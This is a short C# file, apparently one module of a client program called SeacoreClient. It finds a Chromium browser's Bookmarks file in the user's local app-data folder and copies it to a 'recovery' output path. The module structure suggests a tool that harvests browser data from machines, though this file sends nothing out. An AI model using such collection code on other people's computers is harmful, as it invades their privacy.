using SeacoreClient.Features.Recovery.Utilities;

namespace SeacoreClient.Features.Recovery.Browsers.Chromium
{
    public static class ChromiumBookmarks
    {
        public static void Recover(string browserName, string relativeSearchPath)
        {
            string fileName = ChromiumCommon.FileNames["Bookmarks"];
            string filePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), relativeSearchPath, "Bookmarks");
            if (!File.Exists(filePath)) return;
            string outputPath = UtilitiesCommon.PrepareRecoveryFilePath(browserName, fileName);
            File.Copy(filePath, outputPath, true);
        }
    }
}
